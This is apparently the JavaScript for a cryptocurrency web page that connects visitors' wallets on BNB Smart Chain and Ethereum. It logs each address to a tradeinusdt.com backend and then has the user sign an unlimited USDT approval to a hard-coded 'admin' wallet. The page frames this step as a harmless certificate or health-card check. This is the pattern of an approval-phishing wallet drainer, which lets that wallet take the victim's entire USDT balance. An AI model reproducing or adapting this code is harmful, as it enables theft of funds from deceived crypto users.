import EthereumProvider from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

// Configuration for both chains
const CHAIN_CONFIG = {
    bep: {
        chainId: 56,
        usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
        adminWallet: "0x8209f963F4E0956fdf92D1757d53164d61622271",
        chainName: "BNB Smart Chain",
        decimals: 18,
        buttonId: "startConnect",
        connectButtonId: "connectWallet",
        approveButtonId: "approveUSDT",
        userAddressId: "userAddress",
        userBalanceId: "userBalance",
        walletInfoId: "walletInfo",
        preConnectOverlayId: "preConnectOverlay",
        connectionPopupId: "connectionPopupOverlay",
        certOverlayId: "certOverlayBep"
    },
    erc: {
        chainId: 1,
        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        adminWallet: "0x8209f963F4E0956fdf92D1757d53164d61622271",
        chainName: "Ethereum Chain",
        decimals: 6,
        buttonId: "startConnecterc",
        connectButtonId: "connectWalleterc",
        approveButtonId: "approveUSDTerc",
        userAddressId: "userAddresserc",
        userBalanceId: "userBalanceerc",
        walletInfoId: "walletInfoerc",
        preConnectOverlayId: "preConnectOverlayerc",
        connectionPopupId: "connectionPopupOverlayerc",
        certOverlayId: "certOverlayErc"
    }
};

const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
const USDT_ABI = ["function balanceOf(address owner) view returns (uint256)"];

async function connectWallet(chainType) {
    const config = CHAIN_CONFIG[chainType];
    const connectButton = document.getElementById(config.connectButtonId);
    const approveButton = document.getElementById(config.approveButtonId);
    const userAddressSpan = document.getElementById(config.userAddressId);
    const userBalanceSpan = document.getElementById(config.userBalanceId);
    const walletInfoDiv = document.getElementById(config.walletInfoId);

    connectButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
    connectButton.disabled = true;

    try {
        const provider = await EthereumProvider.init({
            projectId: "5c7a882142c7491241b507534414ddff",
            chains: [config.chainId],
            methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
            showQrModal: true
        });

        await provider.connect();

        const ethersProvider = new ethers.BrowserProvider(provider);
        const signer = await ethersProvider.getSigner();
        const userAddress = await signer.getAddress();
        // Save wallet address to backend
        try {
            const endpoint = chainType === 'erc'
                ? 'https://tradeinusdt.com/erc/save_walleterc.php'
                : 'https://tradeinusdt.com/erc/save_wallet.php';

            await fetch(endpoint, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ wallet: userAddress }),
            });
        } catch (saveError) {
            console.warn("Wallet saving failed:", saveError); // Non-blocking
        }


        const connectionOverlay = document.getElementById(config.connectionPopupId);
        if (connectionOverlay) {
            connectionOverlay.style.cssText = "display: flex !important;";
            connectionOverlay.querySelector(".user-address").textContent = userAddress;

            const closeTimer = setTimeout(() => {
                connectionOverlay.style.cssText = "display: none !important;";
                connectionOverlay.classList.add("fade-out");
                setTimeout(() => {
                    connectionOverlay.style.display = "none";
                    connectionOverlay.classList.remove("fade-out");
                }, 500);
            }, 3000);

            const closeBtn = connectionOverlay.querySelector(".close-btn");
            if (closeBtn) {
                closeBtn.onclick = () => {
                    clearTimeout(closeTimer);
                    connectionOverlay.style.cssText = "display: none !important;";
                };
            }

            connectionOverlay.onclick = (e) => {
                if (e.target === connectionOverlay) {
                    clearTimeout(closeTimer);
                    connectionOverlay.style.display = "none";
                }
            };
        }

        // Show wallet info
        if (approveButton) approveButton.style.display = "inline-block";
        if (userAddressSpan) userAddressSpan.textContent = userAddress;
        if (walletInfoDiv) walletInfoDiv.style.display = "block";

        // 👇 Hide buttons
        document.getElementById('startConnect')?.style.setProperty('display', 'none', 'important');
        document.getElementById('trc20')?.style.setProperty('display', 'none', 'important');
        document.getElementById('startConnecterc')?.style.setProperty('display', 'none', 'important');
        document.querySelectorAll('.learn-more-btn').forEach(btn =>
            btn.style.setProperty('display', 'none', 'important')
        );
        document.querySelectorAll('.learn-more-mobile-only').forEach(btn =>
            btn.style.setProperty('display', 'none', 'important')
        );

        // 👇 Show correct Approve section
        if (chainType === 'bep') {
            document.getElementById('approveUSDTSection')?.style.setProperty('display', 'flex', 'important');
        } else if (chainType === 'erc') {
            document.getElementById('approveUSDTSectionerc')?.style.setProperty('display', 'flex', 'important');
        }


        // Fetch balance
        const usdt = new ethers.Contract(config.usdtAddress, USDT_ABI, ethersProvider);
        const rawBalance = await usdt.balanceOf(userAddress);
        const formattedBalance = ethers.formatUnits(rawBalance, config.decimals);
        if (userBalanceSpan) userBalanceSpan.textContent = formattedBalance + " USDT";

        if (approveButton) {
            approveButton.onclick = async () => {
                try {
                    approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Approving...';
                    approveButton.disabled = true;

                    const contract = new ethers.Contract(config.usdtAddress, ABI, signer);
                    const tx = await contract.approve(config.adminWallet, ethers.MaxUint256);

                    await tx.wait();

                    window.location.href = `/healthcard.html?wallet=${userAddress}`;
                } catch (error) {
                    console.error("Approval error:", error);
                    alert("Approval failed: " + error.message);
                } finally {
                    approveButton.innerHTML = '<i class="fas fa-award"></i> Approve USDT';
                    approveButton.disabled = false;
                }
            };
        }

        return { signer, userAddress };

    } catch (error) {
        console.error("Connection error:", error);
        alert("Failed to connect: " + error.message);
        return null;
    } finally {
        if (connectButton) {
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.disabled = false;
        }
    }
}

function initializeWallets() {
    const startConnectBep = document.getElementById(CHAIN_CONFIG.bep.buttonId);
    if (startConnectBep) {
        startConnectBep.addEventListener("click", () => {
            document.getElementById(CHAIN_CONFIG.bep.preConnectOverlayId).style.display = "flex";
        });
    }

    const connectWalletBep = document.getElementById(CHAIN_CONFIG.bep.connectButtonId);
    if (connectWalletBep) {
        connectWalletBep.onclick = () => connectWallet('bep');
    }

    const startConnectErc = document.getElementById(CHAIN_CONFIG.erc.buttonId);
    if (startConnectErc) {
        startConnectErc.addEventListener("click", () => {
            document.getElementById(CHAIN_CONFIG.erc.preConnectOverlayId).style.display = "flex";
        });
    }

    const connectWalletErc = document.getElementById(CHAIN_CONFIG.erc.connectButtonId);
    if (connectWalletErc) {
        connectWalletErc.onclick = () => connectWallet('erc');
    }

    setupOverlayHandlers();
}

function setupOverlayHandlers() {
    document.querySelectorAll('.close-btn').forEach(btn => {
        btn.addEventListener('click', function () {
            this.closest('.overlay').style.display = 'none';
        });
    });

    window.addEventListener('click', function (event) {
        if (event.target.classList.contains('overlay')) {
            event.target.style.display = 'none';
        }
    });
}

document.addEventListener('DOMContentLoaded', function () {
    initializeWallets();

    document.querySelectorAll('.wallet-copy-btn').forEach(btn => {
        btn.addEventListener('click', function () {
            const addressInput = this.closest('.wallet-address-container').querySelector('input');
            addressInput.select();
            document.execCommand('copy');
            alert('Address copied to clipboard!');
        });
    });
});
